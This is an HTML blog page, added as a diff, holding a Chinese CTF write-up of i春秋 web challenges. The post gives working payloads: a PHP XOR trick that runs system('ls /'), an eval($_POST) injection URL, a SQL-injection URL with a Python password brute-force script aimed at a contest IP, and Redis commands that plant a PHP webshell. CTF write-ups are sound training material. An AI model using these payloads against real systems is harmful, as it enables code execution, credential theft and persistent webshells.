@@ -1,0 +1,280 @@
+<!DOCTYPE html>
+<html lang=en>
+<head><meta name="generator" content="Hexo 3.9.0">
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="description" content="i春秋CTF夺旗赛(第一季) WEBmath2019国赛线上赛的加强版，ban掉了base_convert,dechex无法通过进制转换造出来字母了mt_rand^23==&amp;gt;_G和rand^75==&amp;gt;ET异或构造出来_G和ET利用PHP的可变变量使得$pi=&amp;quot;_GET&amp;quot;变为$pi=&amp;quot;$_GET再利用php的{}内也可执行payload 1c=$pi=(is">
+<meta property="og:type" content="article">
+<meta property="og:title" content="i春秋CTF夺旗赛(第一季)">
+<meta property="og:url" content="http://yoursite.com/2019/09/16/i春秋CTF夺旗赛-第一季/index.html">
+<meta property="og:site_name" content="dkk-blog">
+<meta property="og:description" content="i春秋CTF夺旗赛(第一季) WEBmath2019国赛线上赛的加强版，ban掉了base_convert,dechex无法通过进制转换造出来字母了mt_rand^23==&amp;gt;_G和rand^75==&amp;gt;ET异或构造出来_G和ET利用PHP的可变变量使得$pi=&amp;quot;_GET&amp;quot;变为$pi=&amp;quot;$_GET再利用php的{}内也可执行payload 1c=$pi=(is">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="http://yoursite.com/2019/09/16/i春秋CTF夺旗赛-第一季/img/1_blog/1.png">
+<meta property="og:image" content="http://yoursite.com/2019/09/16/i春秋CTF夺旗赛-第一季/img/1_blog/2.png">
+<meta property="og:image" content="http://yoursite.com/2019/09/16/i春秋CTF夺旗赛-第一季/img/1_blog/3.png">
+<meta property="og:image" content="http://yoursite.com/2019/09/16/i春秋CTF夺旗赛-第一季/img/1_blog/4.png">
+<meta property="og:image" content="http://yoursite.com/2019/09/16/i春秋CTF夺旗赛-第一季/img/1_blog/5.png">
+<meta property="og:image" content="http://yoursite.com/2019/09/16/i春秋CTF夺旗赛-第一季/img/1_blog/6.png">
+<meta property="og:updated_time" content="2019-09-20T12:13:16.121Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="i春秋CTF夺旗赛(第一季)">
+<meta name="twitter:description" content="i春秋CTF夺旗赛(第一季) WEBmath2019国赛线上赛的加强版，ban掉了base_convert,dechex无法通过进制转换造出来字母了mt_rand^23==&amp;gt;_G和rand^75==&amp;gt;ET异或构造出来_G和ET利用PHP的可变变量使得$pi=&amp;quot;_GET&amp;quot;变为$pi=&amp;quot;$_GET再利用php的{}内也可执行payload 1c=$pi=(is">
+<meta name="twitter:image" content="http://yoursite.com/2019/09/16/i春秋CTF夺旗赛-第一季/img/1_blog/1.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>i春秋CTF夺旗赛(第一季)</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- persian styles -->
+    
+      <link rel="stylesheet" href="/css/rtl.css">
+    
+    <!-- rss -->
+    
+    
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/projects_url">Projects</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" href="/2019/09/16/First-Blog/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2019/09/16/i春秋CTF夺旗赛-第一季/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2019/09/16/i春秋CTF夺旗赛-第一季/&text=i春秋CTF夺旗赛(第一季)"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2019/09/16/i春秋CTF夺旗赛-第一季/&title=i春秋CTF夺旗赛(第一季)"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2019/09/16/i春秋CTF夺旗赛-第一季/&is_video=false&description=i春秋CTF夺旗赛(第一季)"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=i春秋CTF夺旗赛(第一季)&body=Check out this article: http://yoursite.com/2019/09/16/i春秋CTF夺旗赛-第一季/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2019/09/16/i春秋CTF夺旗赛-第一季/&title=i春秋CTF夺旗赛(第一季)"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2019/09/16/i春秋CTF夺旗赛-第一季/&title=i春秋CTF夺旗赛(第一季)"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2019/09/16/i春秋CTF夺旗赛-第一季/&title=i春秋CTF夺旗赛(第一季)"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2019/09/16/i春秋CTF夺旗赛-第一季/&title=i春秋CTF夺旗赛(第一季)"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2019/09/16/i春秋CTF夺旗赛-第一季/&name=i春秋CTF夺旗赛(第一季)&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#i春秋CTF夺旗赛-第一季"><span class="toc-number">1.</span> <span class="toc-text">i春秋CTF夺旗赛(第一季)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#WEB"><span class="toc-number">1.1.</span> <span class="toc-text">WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#math"><span class="toc-number">1.1.1.</span> <span class="toc-text">math</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#easyphp"><span class="toc-number">1.1.2.</span> <span class="toc-text">easyphp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#crypto-rsa"><span class="toc-number">1.1.3.</span> <span class="toc-text">crypto-rsa</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mysql"><span class="toc-number">1.1.4.</span> <span class="toc-text">mysql</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#redis"><span class="toc-number">1.1.5.</span> <span class="toc-text">redis</span></a></li></ol></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        i春秋CTF夺旗赛(第一季)
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">dkk-blog</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2019-09-16T11:08:30.000Z" itemprop="datePublished">2019-09-16</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h1 id="i春秋CTF夺旗赛-第一季"><a href="#i春秋CTF夺旗赛-第一季" class="headerlink" title="i春秋CTF夺旗赛(第一季)"></a>i春秋CTF夺旗赛(第一季)</h1><hr>
+<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="math"><a href="#math" class="headerlink" title="math"></a>math</h3><p>2019国赛线上赛的加强版，ban掉了<code>base_convert</code>,<code>dechex</code>无法通过进制转换造出来字母了<br><img src="img/1_blog/1.png" alt="2" style="zoom:50%;"><br><code>mt_rand^23==&gt;_G</code>和<code>rand^75==&gt;ET</code>异或构造出来<code>_G</code>和<code>ET</code><br><img src="img/1_blog/2.png" alt="2" style="zoom:50%;"><br><img src="img/1_blog/3.png" style="zoom:50%;"><br>利用PHP的可变变量使得<code>$pi=&quot;_GET&quot;</code>变为<code>$pi=&quot;$_GET</code><br>再利用php的<code>{}</code>内也可执行<br><img src="img/1_blog/4.png" style="zoom:50%;"><br><img src="img/1_blog/5.png" style="zoom:50%;"><br>payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=$pi=(is_nan^(6).(4)).(rand^(7).(5));$pi=$$pi;$pi&#123;0&#125;($pi&#123;1&#125;)&amp;0=system&amp;1=ls /</span><br></pre></td></tr></table></figure>
+
+<h3 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h3><p>源码泄露index.php.bak<br><img src="img/1_blog/6.png" style="zoom:50%;"><br>直接构造闭合<code>&#39;);payload//</code><br>payload<code>http://url/?file=.%27)===eval($_POST[&quot;a&quot;]);//</code></p>
+<h3 id="crypto-rsa"><a href="#crypto-rsa" class="headerlink" title="crypto-rsa"></a>crypto-rsa</h3><p>i 春秋环境炸裂</p>
+<h3 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h3><p>i 春秋环境炸裂<br>前面SQL注入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://39.106.94.18:13004/login.php?username=admin\&amp;passwd=||passwd/**/regexp/**/&quot;1&quot;;%00</span><br></pre></td></tr></table></figure>
+
+<p>爆破密码脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">req = requests.Session()</span><br><span class="line">payload = <span class="string">""</span></span><br><span class="line">code = string.ascii_letters + string.digits</span><br><span class="line"><span class="comment">#print(req.get(url).content.decode("utf-8"))</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">40</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> code:</span><br><span class="line">        url = <span class="string">'http://39.106.94.18:13004/login.php?username=\&amp;passwd=||passwd/**/regexp/**/"^&#123;&#125;&#123;&#125;";%00'</span>.format(payload,j)</span><br><span class="line">        <span class="comment">#print(req.get(url).content.decode("utf-8"))</span></span><br><span class="line">        <span class="comment">#print(url)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">"Welcome admin"</span><span class="keyword">in</span> req.get(url).content.decode(<span class="string">"utf-8"</span>):</span><br><span class="line">            payload += j</span><br><span class="line">            print(payload)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">continue</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="redis"><a href="#redis" class="headerlink" title="redis"></a>redis</h3><p>payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">config set dir /www</span><br><span class="line">config set dbfilename dkk.php</span><br><span class="line">set shell &quot;&lt;?php eval($_POST[&quot;pass&quot;]) ?&gt;&quot;</span><br><span class="line">访问dkk.php</span><br></pre></td></tr></table></figure>
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/projects_url">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#i春秋CTF夺旗赛-第一季"><span class="toc-number">1.</span> <span class="toc-text">i春秋CTF夺旗赛(第一季)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#WEB"><span class="toc-number">1.1.</span> <span class="toc-text">WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#math"><span class="toc-number">1.1.1.</span> <span class="toc-text">math</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#easyphp"><span class="toc-number">1.1.2.</span> <span class="toc-text">easyphp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#crypto-rsa"><span class="toc-number">1.1.3.</span> <span class="toc-text">crypto-rsa</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mysql"><span class="toc-number">1.1.4.</span> <span class="toc-text">mysql</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#redis"><span class="toc-number">1.1.5.</span> <span class="toc-text">redis</span></a></li></ol></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2019/09/16/i春秋CTF夺旗赛-第一季/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2019/09/16/i春秋CTF夺旗赛-第一季/&text=i春秋CTF夺旗赛(第一季)"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2019/09/16/i春秋CTF夺旗赛-第一季/&title=i春秋CTF夺旗赛(第一季)"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2019/09/16/i春秋CTF夺旗赛-第一季/&is_video=false&description=i春秋CTF夺旗赛(第一季)"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=i春秋CTF夺旗赛(第一季)&body=Check out this article: http://yoursite.com/2019/09/16/i春秋CTF夺旗赛-第一季/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2019/09/16/i春秋CTF夺旗赛-第一季/&title=i春秋CTF夺旗赛(第一季)"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2019/09/16/i春秋CTF夺旗赛-第一季/&title=i春秋CTF夺旗赛(第一季)"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2019/09/16/i春秋CTF夺旗赛-第一季/&title=i春秋CTF夺旗赛(第一季)"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2019/09/16/i春秋CTF夺旗赛-第一季/&title=i春秋CTF夺旗赛(第一季)"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2019/09/16/i春秋CTF夺旗赛-第一季/&name=i春秋CTF夺旗赛(第一季)&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2019 John Doe
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/projects_url">Projects</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+    <!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+<!-- clipboard -->
+
+  <script src="/lib/clipboard/clipboard.min.js"></script>
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight .code pre").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      target: function(trigger) {
+        return trigger.nextElementSibling;
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
